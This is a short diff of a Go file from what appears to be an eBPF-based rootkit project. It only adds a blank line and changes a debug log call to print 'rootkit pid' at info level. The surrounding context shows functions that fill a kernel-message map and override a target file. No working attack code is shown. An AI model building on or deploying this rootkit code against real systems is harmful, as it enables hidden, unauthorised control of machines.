@@ -353,6 +353,7 @@ func (e *EBPFKit) FaFillKmsgMap() {
 		kmsgMap.Put(k, d)
 	}
 }
+
 func (e *EBPFKit) applyOverride() {
 	if e.options.SrcFile != "" && e.options.TargetFile != "" {
 		file, err := os.Open(e.options.SrcFile)
@@ -525,7 +526,7 @@ func (e *EBPFKit) start() error {
 
 	e.startTime = time.Now()
 
-	logrus.Debugf("pid: %d\n", os.Getpid())
+	logrus.Infof("rootkit pid: %d\n", os.Getpid())
 
 	return nil
 }
